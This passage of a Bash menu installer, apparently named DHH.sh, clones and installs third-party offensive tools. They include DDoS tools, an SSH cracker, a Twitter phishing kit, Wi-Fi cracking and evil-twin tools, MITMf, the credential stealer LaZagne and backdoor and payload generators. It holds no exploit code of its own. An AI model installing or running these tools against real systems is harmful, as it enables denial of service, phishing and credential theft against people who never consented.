echo -n "Do you want install Hash Create ? [Y/N] :$RED "
read yyy
if [[ $yyy = y || $yyy = Y ]];then
clear
echo
echo $GREEN"checking internet connection...."
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $BLUE"=======install Hash Create for you========"
sleep 4
echo $GREEN"[*]working....."
sleep 1
git clone https://github.com/Oseid/HashCreate.git
echo $GREEN"[*]Finishing....."
sleep 7
clear
else
if [[ $yyy = N || $yyy = n ]];then
clear
fi
fi

}

function WordLsGen {
clear
echo
echo "" $GREEN
echo -n "Do you want install WordLsGen ? [Y/N] : $RED"
read yyyy
if [[ $yyyy = y || $yyyy = Y ]];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $BLUE"=========install WordLsGen for you========="
sleep 4
echo "[*]working....."
sleep 1
git clone https://github.com/Oseid/WordLsGen.git
echo $GREEN"[*]Finishing....."
sleep 7
clear
else
if [[ $yyyy = N || $yyyy = n ]];then
clear
fi
fi

}

function FindHosts {
clear
echo
echo "" $GREEN
echo -n "Do you want install FindHosts ? [Y/N] : $RED"
read coie
if [[ $coie = Y || $coie = y ]];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $BLUE"=======install FindHosts for you============="
sleep 4
echo "[*]working....."
sleep 1
git clone https://github.com/Oseid/FindHosts.git
echo $GREEN"[*]Finishing....."
sleep 7
clear
else
if [[ $coie = N || $coie = n ]];then
clear
fi
fi

}

function SSH-CRACKER {
clear
echo
echo "" $GREEN
echo -n "Do you want install SSH-CRACKER [Y/N] : $RED "
read instal
if [[ $instal = Y || $instal = y ]];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $BLUE"===========install SSH-CRACKER for you============="
sleep 4
echo "[*]working....."
sleep 1
git clone https://github.com/Oseid/SSH-CRACKER.git
echo "[*]Finishing....."
sleep 7
clear
else
if [[ $instal = N || $instal = n ]];then
clear
fi
fi

}

function FindAdminPage {
clear
echo
echo "" $GREEN
echo -n "Do you want install FindAdminPage ? [Y/N] : $RED"
read sdf
if [[ $sdf = Y || $sdf = y ]];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $BLUE"======install FindAdminPage for you======"
sleep 4
echo "[*]working....."
sleep 1
git clone https://github.com/Oseid/FindAdminPage.git
echo $GREEN"[*]Finishing....."
sleep 7
clear
else
if [[ $sdf = N || $sdf = n ]];then
clear
fi
fi

}

function DDOSAR2 {
clear
echo
echo "" $GREEN
echo -n "Do you want install DDOSAR2 ? [Y/N] : $RED "
read ghj
if [[ $ghj = Y || $ghj = y ]];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $BLUE"======install DDOSAR2 for you======="
sleep 4
echo "[*]working....."
sleep 1
git clone https://github.com/Oseid/DDOSAR2.git
echo $GREEN"[*]Finishing....."
sleep 7
clear
else
if [[ $ghj = N || $ghj = n ]];then
clear
fi
fi

}

function TwitterPhishing {
clear
echo
echo "" $GREEN
echo -n "Do you want install TwitterPhishing ? [Y/N] : $RED"
read tti
if [[ $tti = Y || $tti = y ]];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $BLUE"=======install TwitterPhishing for you======"
sleep 4
echo "[*]working....."
sleep 1
git clone https://github.com/Oseid/TwitterPhishing.git
pip install mechanicalsoup
echo $GREEN"[*]Finishing....."
sleep 7
clear
else
if [[ $tti = N || $tti = n ]];then
clear
fi
fi

}

function netools {
clear
echo
echo
echo ""$GREEN
echo "###########################################################################################################"
echo "                                                                                                           "
echo "MY tools :)                                                                                                "$RED 
echo "                                                                                                           "
echo "   _________ _______  _        _______  _______  __    __ _________ _______  _______  _        _______     "
echo "   \__    _/(  ___  )| \    /\(  ____ \(  ____ )/  \  /  \\__   __/(  ___  )(  ___  )( \      (  ____ \    "
echo "      )  (  | (   ) ||  \  / /| (    \/| (    )|\/) ) \/) )  ) (   | (   ) || (   ) || (      | (    \/    "
echo "      |  |  | |   | ||  (_/ / | (__    | (____)|  | |   | |  | |   | |   | || |   | || |      | (_____     "
echo "      |$BLUE O$RED|  | |$BLUE S$RED | ||$BLUE E$RED _ (  |$BLUE I$RED _)   |$BLUE D$RED    _)  | |   | |  | |   | |   | || |   | || |      (_____  )    "
echo "      |  |  | |   | ||  ( \ \ | (      | (\ (     | |   | |  | |   | |   | || |   | || |            ) |    "
echo "   |\_)  )  | (___) ||  /  \ \| (____/\| ) \ \____) (___) (_ | |   | (___) || (___) || (____/\/\____) |    "
echo "   (____/   (_______)|_/    \/(_______/|/   \__/\____/\____/ )_(   (_______)(_______)(_______/\_______)    "
echo "                                                                                                           "$GREEN
echo "                                                                                                           "
echo "###########################################################################################################"
echo                                     "Let's install my tools for you :) "
echo "###########################################################################################################"$BLUE
echo ""
select netselc in "install NetSniper" "install Hash Create" "install WordLsGen" "install FindHosts" "install SSH-CRACKER" "install FindAdminPage" "install DDOSAR2" "install TwitterPhishing" "Exit"; do
case $netselc in
         "install NetSniper")
                  NetSniper
                  clear ;;
        "install Hash Create")
                  HashCreate
                  clear ;;
        "install WordLsGen")
                  WordLsGen
                  clear ;;
        "install FindHosts")
                  FindHosts
                  clear ;;
        "install SSH-CRACKER")
                  SSH-CRACKER
                  clear ;;
        "install FindAdminPage")
                  FindAdminPage
                  clear ;;
        "install DDOSAR2")
                  DDOSAR2
                  clear ;;
        "install TwitterPhishing")
                  TwitterPhishing
                  clear ;;
        "Exit")                   
        clear && exit 0 ;;
		
	* )
		screwup
		clear ;;


esac

break

done
}
while true; do netools; done

else
if [ $word = 5 ] ;then
clear
echo
echo
echo                   
echo ""
echo $BLUE"              #    DDOS ATTACK TOOLS MENU      #";                              
echo $RED"              #================================#";
echo $BLUE"              # 1.     install GoldenEye       #";
echo $BLUE"              # 2.     install DAVOSET         #";
echo $BLUE"              # 3.     install hammer          #";
echo $BLUE"              # 4.     install slowloris       #";
echo $BLUE"              # 5.     install DDOSAR2         #";
echo $BLUE"              # 6.     install torshammer      #";
echo $BLUE"              # 7.     Return to Main Menu     #";
echo $RED "             #================================#";
echo "" $BLUE
echo -n "Enter choice ->> "$RED
read www
if [[ $www == '' ]];then
clear
./DHH.sh
else
if [ $www = 1 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $RED  "==========install GoldenEye for you======== "
sleep 4
echo "[*]working....."
sleep 1
git clone https://github.com/jseidl/GoldenEye.git
echo "[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $www = 2 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $RED   "=====install DAVOSET for you====== "
sleep 4
echo "[*]working....."
sleep 1
git clone https://github.com/MustLive/DAVOSET.git
echo "[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $www = 3 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $RED"=====install hammer for you========"
sleep 4
echo "[*]working....."
sleep 1
git clone https://github.com/cyweb/hammer.git
echo "[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $www = 4 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $RED"============install slowloris for you============="
sleep 4
echo "[*]working....."
sleep 1
git clone https://github.com/llaera/slowloris.pl.git
echo "[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $www = 5 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $RED"========install DDOSAR2 for you========="
sleep 4
echo "[*]working....."
sleep 1
git clone https://github.com/Oseid/DDOSAR2.git
echo "[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $www = 6 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $RED"========install torshammer for you========"
sleep 4
echo
echo "[*]working....."
sleep 1
git clone https://github.com/dotfighter/torshammer.git
echo "[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $www = 7 ];then
clear
./DHH.sh
fi
fi
fi
fi
fi
fi
fi
fi
else
if [ $word = 6 ];then
clear
echo
echo
echo
echo
echo ""
echo $RED"   *       NETWORK TOOLS MENU        *";             
echo $GREEN "  *=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=*";
echo $BLUE"   *   1 .  install morpheus         *";
echo $BLUE"   *   2 .  install net-toolkit      *";
echo $BLUE"   *   3 .  install NetSniper        *";
echo $BLUE"   *   4 .  install routersploit     *";
echo $BLUE"   *   5 .  install bettercap        *";
echo $BLUE"   *   6 .  install xerosploit       *";
echo $BLUE"   *   7 .  install linset           *";
echo $BLUE"   *   8 .  install fluxion          *";
echo $BLUE"   *   9 .  install netattack2       *";
echo $BLUE"   *  10 .  install kickthemout      *";
echo $BLUE"   *  11 .  install Wpsbreaker       *";
echo $BLUE"   *  12 .  install Wifiphiser       *";
echo $BLUE"   *  13 .  install wifite           *";
echo $BLUE"   *  14 .  install wpa-autopwn      *";
echo $BLUE"   *  15 .  install hostapd-wpe      *";
echo $BLUE"   *  16 .  install HT-WPS breaker   *"; 
echo $BLUE"   *  17 .  install websploit        *";
echo $BLUE"   *  18 .  install Aircrack         *"; 
echo $BLUE"   *  19 .  install mitmf            *";
echo $BLUE"   *  20 .  Return to Main Menu      *";
echo $GREEN"   *=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-*";
echo "" $BLUE
echo -n "Enter choice ->> "$RED
read eee
if [[ $eee == '' ]];then
clear
./DHH.sh
else
if [ $eee = 1 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "=======install morpheus for you====="
sleep 4
echo "[*]working....."
sleep 1
git clone https://github.com/r00t-3xp10it/morpheus.git
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $eee = 2 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "=====install net-toolkit for you======"
sleep 4
echo "[*]working....."
sleep 1
git clone https://github.com/r00t-3xp10it/netool-toolkit.git
cd netool-toolkit/
chmod +x INSTALL.sh 
./INSTALL.sh 
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $eee = 3 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "========install NetSniper for you======== "
sleep 4
echo "[*]working....."
sleep 1
git clone https://github.com/Oseid/NetSniper.git
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $eee = 4 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "======install routersploit for you=========="
sleep 4
echo "[*]working....."
sleep 1
git clone https://github.com/reverse-shell/routersploit.git
cd routersploit/
chmod +x requirements.txt
pip install -r requirements.txt
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $eee = 5 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "========install bettercap for you======="
sleep 4
echo "[*]working....."
sudo apt-get -y install bettercap
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $eee = 6 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "=========install xerosploit for you======="
sleep 4
echo "[*]working......"
sleep 1
git clone https://github.com/LionSec/xerosploit.git
cd xerosploit/
chmod +x install.py
./install.py
echo $GREEN"[*]Finishing....."
clear
./DHH.sh
else
if [ $eee = 7 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "========install Linset for you============"
sleep 4
echo "[*]working......"
sleep 1
git clone https://github.com/vk496/linset.git && apt-get --yes install php-cgi && apt-get --yes install dhcpd && apt-get --yes install hostapd  
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $eee = 8 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) "
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "=====install fluxion for you========"
sleep 4
echo "[*]working........"
sleep 1
git clone https://github.com/wi-fi-analyzer/fluxion.git
cd fluxion/
chmod +x Installer.sh
./Installer.sh
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $eee = 9 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "======install netattack2 for you======"
sleep 4
echo "[*]working...."
sleep 1
git clone https://github.com/chrizator/netattack2.git
sudo apt-get -y  install python-nmap python-argparse python iw
echo
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $eee = 10 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "======install kickthemout for you======="
sleep 4
echo "[*]working......"
sleep 1
git clone https://github.com/k4m4/kickthemout.git
cd kickthemout/
pip install -r requirements.txt
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $eee = 11 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "========install Wpsbreaker for you=========="
sleep 4
echo "[*]working....."
sleep 1
git clone https://github.com/krlex/WPSBreaker.git
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $eee = 12 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "==========install Wifiphiser for you=========== "
sleep 4
echo "[*]working......"
sleep 1
git clone https://github.com/Tle7839/wifiphiser.git
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $eee = 13 ];then 
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "==========install wifite for you=========== "
sleep 4
echo "[*]working......"
sleep 1
git clone https://github.com/derv82/wifite.git 
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $eee = 14 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "==========install wpa-autopwn for you=========== "
sleep 4
echo "[*]working......"
sleep 1
git clone https://github.com/vnik5287/wpa-autopwn.git
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $eee = 15  ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "==========install hostapd-wpe for you=========== "
sleep 4
echo "[*]working......"
sleep 1
sudo apt-get -y install hostapd-wpe 
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $eee = 16 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "==========install HT-WPS breaker for you=========== "
sleep 4
echo "[*]working......"
sleep 1
git clone https://github.com/SilentGhostX/HT-WPS-Breaker.git
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $eee = 17 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "==========install websploit for you========="
sleep 4
echo "[*]working......."
sleep 1 
sudo apt-get -y install websploit 
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $eee = 18 ];then
clear
echo
echo "" $GREEN
	echo -n "Do you want install aircrack-ng ? $RED [Y/N] : "$BLUE
			read install
			if [[ $install = Y || $install = y ]] ; then	
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "============install aircrack-ng for you============"
sleep 4
echo "[*]working............"
sleep 1
				
				apt-get -y install build-essential libssl-dev libnl-3-dev libnl-genl-3-dev dpkg-dev g++ g++-4.8 libc-dev-bin libc6-dev libstdc++-4.8-dev zlib1g-dev debian-keyring g++-multilib g++-4.8-multilib gcc-4.8-doc libstdc++6-4.8-dbg glibc-doc libstdc++-4.8-doc libalgorithm-merge-perl libssl-doc libalgorithm-diff-xs-perl libssl-dev build-essential
				wget http://download.aircrack-ng.org/aircrack-ng-1.2-rc4.tar.gz
				tar -xzf aircrack-ng-1.2-rc4.tar.gz
				cd aircrack-ng-1.2-rc4
				make && make install
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
				
			else
if [[ $install = N || $install = n ]] ; then
clear
./DHH.sh
			fi	
			fi
else
if [ $eee = 19 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo 
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
	                        echo "$RED====== Install mitmf for you ======"
                                sleep 4
                                echo "[*]working..........."
                                sleep 1
				
				
				git clone https://github.com/byt3bl33d3r/MITMf.git 
				cd MITMf/
                                chmod +x *
				./setup.sh
				apt-get -y install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev
				pip install --upgrade -r requirements.txt
                                cd ..
else
if [ $eee = 20 ];then
clear
./DHH.sh
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
else
if [ $word = 7 ];then
clear
echo
echo
echo
echo
echo ""
echo $BLUE"          +          GEN PYLOAD TOOLS MENU            +";
echo $GREEN"          +++++++++++++++++++++++++++++++++++++++++++++";
echo $GREEN"          +      1.   install Empire-framework        +";
echo $GREEN"          +      2.   install Backdoor Factory        +";
echo $GREEN"          +      3.   install unicorn                 +";
echo $GREEN"          +      4.   install venom                   +";
echo $GREEN"          +      5.   install TheFatRat               +";
echo $GREEN"          +      6.   install ezsploit-fremework      +";
echo $GREEN"          +      7.   install Veil-Evasion            +";
echo $GREEN"          +      8.   install pupy                    +";
echo $GREEN"          +      9.   install Brutal                  +";
echo $GREEN"          +     10.   install kimi                    +";
echo $GREEN"          +     11.   install Shellter                +";
echo $GREEN"          +     12.   install Avoid                   +";
echo $GREEN"          +     13.   install Netripper               +";
echo $GREEN"          +     14.   install LaZagne                 +";
echo $GREEN"          +     15.   install NXcrypt                 +";
echo $GREEN"          +     16.   install ktana-fremework         +";
echo $GREEN"          +                                           +";
echo $RED"          +==============Android Tools================+";
echo $GREEN"          +                                           +";
echo $GREEN"          +     17.   kwetza-Android                  +";
echo $GREEN"          +     18.   backdoor-APK-Android            +";
echo $GREEN"          +     19.   back to menu                    +";
echo $GREEN"          +++++++++++++++++++++++++++++++++++++++++++++";
echo "" $BLUE
echo -n "Enter choice ->> "$RED
read rr
if [[ $rr == '' ]];then
clear
./DHH.sh
else
if [ $rr = 1 ];then
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo "=========install Empire-framework for you========== "
sleep 4
echo "[*]working....."
sleep 1
git clone https://github.com/EmpireProject/Empire.git
cd Empire/setup
chmod +x *
./install.sh
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
else
if [ $rr = 2 ];then
clear
echo
echo ""$GREEN
echo -n "Do you want install Backdoor Factory ? [Y/N] : $RED"
			read install
			if [[ $install = Y || $install = y ]] ; then	
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
				echo $RED"==========install Backdoor Factory for you============="
sleep 4
echo "[*]working........."
sleep 1
				
				git clone https://github.com/secretsquirrel/the-backdoor-factory.git
				cd the-backdoor-factory/
                                chmod +x *
				./install.sh
                                cd ..
echo $GREEN"[*]Finishing....."
sleep 7
clear
./DHH.sh
			else
			if [[ $install = N || $install = n ]] ; then	

clear
./DHH.sh
			fi
                        fi
	else
if [ $rr = 3 ];then
clear
echo
